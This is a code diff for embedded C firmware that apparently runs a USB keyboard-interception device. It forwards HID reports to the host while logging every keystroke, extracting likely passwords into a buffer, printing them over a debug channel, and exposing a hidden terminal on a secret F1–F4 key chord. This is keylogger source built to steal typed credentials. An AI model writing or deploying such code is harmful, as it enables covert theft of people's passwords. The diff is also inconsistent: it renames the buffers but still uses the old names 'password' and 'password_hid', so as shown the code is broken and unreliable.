@@ -22,23 +22,21 @@
 /*
  * variables
  */
-uint8_t input_hid[NB_INPUT];
-int     input_index = 0;
 
-static uint8_t input_tab[NB_INPUT];
+static uint8_t inputs[NB_INPUT];
 static int     input_timer = -1;
+int            input_index = 0;
 
 static int nb_char_pressed = 0;
 uint8_t    led_status      = 7;
 
-uint8_t password[PASSWORD_BUFFER_SIZE];
-uint8_t password_hid[PASSWORD_BUFFER_SIZE];
-int     password_idx;
+uint8_t passwords[PASSWORD_BUFFER_SIZE];
+int     password_index = 0;
 
 /*
  * prototypes
  */
-static void usbh_detector(uint8_t input);
+static void usbh_detector(uint16_t input);
 
 /*
  * thread HID
@@ -60,23 +58,24 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
         usb_report(&UHD2, report, 8);
 
         //get every input in a tab
-        uint8_t input = hid2azerty(report);
-        rtt_printf("Key code: %02X = %c   \tidx = %02x", report[2], input, input_index);
-        if(input) {
-            input_tab[input_index] = input;
+        uint16_t input = get_input_hid(report);
+        rtt_printf("Key code: %04x, input_index = %d", input, input_index);
+        if((uint8_t)input) {
+            rtt_printf("INPUT");
+            inputs[input_index] = input;
             usbh_detector(input);
             if(input_index++ >= 200)
                 input_index = 0;
         }
 
         if(report[2] == KEY_F2)
-            for(int i = 0; i < password_idx; i++)
-                rtt_printf("%02x", password[i]);
+            for(int i = 0; i < password_index; i++)
+                rtt_printf("%02x", password_hid[i]);
 
-        if(report[2] == KEY_F2 &&
-           report[3] == KEY_F3 &&
-           report[4] == KEY_F4 &&
-           report[5] == KEY_F5)
+        if(report[2] == KEY_F1 &&
+           report[3] == KEY_F2 &&
+           report[4] == KEY_F3 &&
+           report[5] == KEY_F4)
             usb_password_terminal(&UHD2);
     }
 }
@@ -123,19 +122,18 @@ static void ThreadTestHID(void *p)
  */
 void usbh_init(void)
 {
-    password[0]  = 'P';
-    password[1]  = 'a';
-    password[2]  = 's';
-    password[3]  = 's';
-    password[4]  = ' ';
-    password[5]  = 'W';
-    password[6]  = 'o';
-    password[7]  = 'r';
-    password[8]  = 'd';
-    password[9]  = ' ';
-    password[10] = '!';
+    //  password[0] = 'P';
+    //  password[1] = 'a';
+    //  password[2] = 's';
+    //  password[3] = 's';
+    //  password[4] = 'W';
+    //  password[5] = 'o';
+    //  password[6] = 'r';
+    //  password[7] = 'd';
+    //  password[8] = ' ';
+    //  password[9] ='!';
 
-    password_idx = 11;
+    //  password_index = 10;
     /*USBH_FS OTG*/
     palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
     palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
@@ -157,18 +155,16 @@ static void store_lasts_inputs(int size)
 {
     if(input_index < size) {  // buffer made a loop
         int bytes_written = size - input_index;
-        memcpy(password + password_idx, input_tab + NB_INPUT - bytes_written, bytes_written);
-        memcpy(password + password_idx + bytes_written, input_tab, size - bytes_written);
-        memcpy(password_hid + password_idx, input_hid + NB_INPUT - bytes_written, bytes_written);
-        memcpy(password_hid + password_idx + bytes_written, input_hid, size - bytes_written);
+        memcpy(password + password_index, inputs + NB_INPUT - bytes_written, bytes_written);
+        memcpy(password + password_index + bytes_written, inputs, size - bytes_written);
     } else
-        memcpy(password + password_idx, input_tab + input_index - size, size);
-    password_idx += size;
+        memcpy(password + password_index, inputs + input_index - size, size);
+    password_index += size;
 }
 
-void usbh_detector(uint8_t input)
+void usbh_detector(uint16_t input)
 {
-    if(password_idx + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
+    if(password_index + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
         rtt_printf("[WARNING] Password buffer full\n");
         return;
     }
@@ -193,7 +189,7 @@ void usbh_detector(uint8_t input)
             input_timer = -1;
             // print password buffer
             rtt_printf("PASSWORD :");
-            SEGGER_RTT_Write(0, password, password_idx);
+            SEGGER_RTT_Write(0, password, password_index);
             rtt_printf("");
             break;
     }
@@ -204,7 +200,7 @@ void usbh_detector(uint8_t input)
     if(input_timer == 0) {
         store_lasts_inputs(PASSWORD_MAX_SIZE);
         rtt_printf("PASSWORD :");
-        SEGGER_RTT_Write(0, password, password_idx);
+        SEGGER_RTT_Write(0, password, password_index);
         rtt_printf("");
     }
 }
